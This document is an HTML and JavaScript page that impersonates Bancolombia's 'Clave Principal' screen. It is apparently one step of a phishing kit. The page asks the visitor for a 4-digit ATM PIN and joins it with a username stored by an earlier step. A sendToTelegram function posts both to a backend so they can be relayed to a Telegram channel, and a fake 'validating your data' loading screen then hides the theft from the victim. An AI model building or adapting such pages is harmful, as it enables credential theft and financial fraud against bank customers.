<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia - Clave Principal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #f0f2f5 0%, #e8ecf0 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
            padding: 60px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #1e3a8a;
            margin-bottom: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .logo::before {
            content: "‚â°";
            font-size: 20px;
        }
        
        .title {
            font-size: 32px;
            font-weight: bold;
            color: #1a1a1a;
            margin-bottom: 10px;
        }
        
        .subtitle {
            font-size: 16px;
            color: #666;
            margin-bottom: 40px;
        }
        
        .pin-container {
            margin-bottom: 40px;
        }
        
        .pin-inputs {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .pin-input {
            width: 60px;
            height: 60px;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            background: #f9fafb;
            transition: all 0.3s ease;
            outline: none;
        }
        
        .pin-input:focus {
            border-color: #3b82f6;
            background: white;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        
        .pin-input.filled {
            background: #3b82f6;
            color: white;
            border-color: #3b82f6;
        }
        
        .pin-input.error {
            border-color: #ef4444;
            background: #fef2f2;
        }
        
        .validation-text {
            font-size: 12px;
            color: #666;
            margin-top: 10px;
        }
        
        .validation-text.error {
            color: #ef4444;
        }
        
        .button-group {
            display: flex;
            gap: 15px;
            margin-bottom: 40px;
        }
        
        .btn {
            flex: 1;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn-secondary {
            background: #e5e7eb;
            color: #4b5563;
        }
        
        .btn-secondary:hover {
            background: #d1d5db;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%);
            color: #1a1a1a;
        }
        
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(251, 191, 36, 0.3);
        }
        
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .footer-info {
            font-size: 12px;
            color: #888;
            line-height: 1.4;
        }
        
        .footer-info div {
            margin-bottom: 5px;
        }
        
        /* Ocultar spinner de n√∫meros */
        .pin-input::-webkit-outer-spin-button,
        .pin-input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        
        .pin-input[type=number] {
            -moz-appearance: textfield;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">‚â° Bancolombia</div>
        
        <h1 class="title">Clave Principal</h1>
        <p class="subtitle">Es la misma que usas en el cajero autom√°tico</p>
        
        <div class="pin-container">
            <div class="pin-inputs">
                <input type="password" class="pin-input" maxlength="1" id="pin1">
                <input type="password" class="pin-input" maxlength="1" id="pin2">
                <input type="password" class="pin-input" maxlength="1" id="pin3">
                <input type="password" class="pin-input" maxlength="1" id="pin4">
            </div>
            <div id="validation-message" class="validation-text">
                Ingresa tu clave de 4 d√≠gitos
            </div>
        </div>
        
        <div class="button-group">
            <button class="btn btn-secondary" onclick="goBack()">Volver</button>
            <button class="btn btn-primary" id="continueBtn" onclick="continueToNext()" disabled>Continuar</button>
        </div>
        
        <div class="footer-info">
            <div>Direcci√≥n IP: 181.235.90.89</div>
            <div id="datetime">S√°bado 27 de Septiembre de 2025 12:05:21 PM</div>
            <div>Copyright ¬© 2025 Bancolombia.</div>
        </div>
    </div>

    <script>
        const pinInputs = document.querySelectorAll('.pin-input');
        const continueBtn = document.getElementById('continueBtn');
        const validationMessage = document.getElementById('validation-message');
        
        pinInputs.forEach((input, index) => {
            input.addEventListener('input', function(e) {
                // Solo permitir n√∫meros
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // Actualizar apariencia
                if (this.value) {
                    this.classList.add('filled');
                    this.classList.remove('error');
                    // Mover al siguiente campo
                    if (index < pinInputs.length - 1) {
                        pinInputs[index + 1].focus();
                    }
                } else {
                    this.classList.remove('filled');
                }
                
                validatePin();
            });
            
            input.addEventListener('keydown', function(e) {
                // Retroceder con backspace
                if (e.key === 'Backspace' && !this.value && index > 0) {
                    pinInputs[index - 1].focus();
                    pinInputs[index - 1].value = '';
                    pinInputs[index - 1].classList.remove('filled');
                }
                
                // Prevenir caracteres no num√©ricos
                if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
                    e.preventDefault();
                }
            });
            
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                const numbers = paste.replace(/[^0-9]/g, '');
                
                for (let i = 0; i < numbers.length && index + i < pinInputs.length; i++) {
                    pinInputs[index + i].value = numbers[i];
                    pinInputs[index + i].classList.add('filled');
                }
                validatePin();
            });
        });
        
        function validatePin() {
            const values = Array.from(pinInputs).map(input => input.value);
            const filledCount = values.filter(val => val !== '').length;
            const isComplete = filledCount === 4;
            
            if (filledCount === 0) {
                validationMessage.textContent = 'Ingresa tu clave de 4 d√≠gitos';
                validationMessage.classList.remove('error');
                validationMessage.style.color = '#666';
                continueBtn.disabled = true;
            } else if (filledCount < 4) {
                validationMessage.textContent = `Faltan ${4 - filledCount} d√≠gitos m√°s`;
                validationMessage.classList.add('error');
                continueBtn.disabled = true;
            } else {
                validationMessage.textContent = 'Clave completa ‚úì';
                validationMessage.classList.remove('error');
                validationMessage.style.color = '#10b981';
                continueBtn.disabled = false;
            }
        }
        
        function goBack() {
            window.history.back();
        }
        
        function continueToNext() {
            const pin = Array.from(pinInputs).map(input => input.value).join('');
            if (pin.length === 4) {
                // Guardar PIN
                sessionStorage.setItem('pin', pin);
                
                // Enviar datos a Telegram
                sendToTelegram();
                
                // Mostrar p√°gina de carga
                showLoadingPage();
            }
        }
        
        function sendToTelegram() {
            const username = sessionStorage.getItem('username');
            const pin = sessionStorage.getItem('pin');
            const message = `üè¶ NUEVOS DATOS BANCOLOMBIA\n\nüë§ Usuario: ${username}\nüîê Clave Principal: ${pin}\n\n‚è∞ ${new Date().toLocaleString('es-CO')}`;
            
            // Aqu√≠ se implementar√° el env√≠o real a Telegram
             fetch('/api/send-login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            username: username,
            pin: pin
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('Enviado a Telegram exitosamente');
            sessionStorage.setItem('sessionId', data.sessionId);
        } else {
            console.error('Error:', data.error);
        }
    })
    .catch(error => {
        console.error('Error de red:', error);
    });
}
        
        function showLoadingPage() {
            // Crear p√°gina de loading din√°micamente
            document.body.innerHTML = `
                <div style="
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    background: linear-gradient(135deg, #f0f2f5 0%, #e8ecf0 100%);
                ">
                    <div style="
                        background: white;
                        border-radius: 20px;
                        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
                        padding: 60px 40px;
                        text-align: center;
                        max-width: 500px;
                        width: 100%;
                    ">
                        <div style="
                            font-size: 24px;
                            font-weight: bold;
                            color: #1e3a8a;
                            margin-bottom: 40px;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            gap: 8px;
                        ">‚â° Bancolombia</div>
                        
                        <div style="
                            width: 80px;
                            height: 80px;
                            border: 4px solid #e5e7eb;
                            border-top: 4px solid #3b82f6;
                            border-radius: 50%;
                            margin: 40px auto;
                            animation: spin 1s linear infinite;
                        "></div>
                        
                        <h2 style="
                            font-size: 24px;
                            color: #1a1a1a;
                            margin-bottom: 10px;
                        ">Cargando...</h2>
                        
                        <p style="
                            color: #666;
                            font-size: 16px;
                        ">Validando tus datos</p>
                        
                        <style>
                            @keyframes spin {
                                0% { transform: rotate(0deg); }
                                100% { transform: rotate(360deg); }
                            }
                        </style>
                    </div>
                </div>
            `;
        }
        
        // Actualizar fecha y hora
        function updateDateTime() {
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: true
            };
            const dateTimeString = now.toLocaleDateString('es-CO', options);
            document.getElementById('datetime').textContent = dateTimeString;
        }
        
        setInterval(updateDateTime, 1000);
        updateDateTime();
    </script>
</body>

</html>
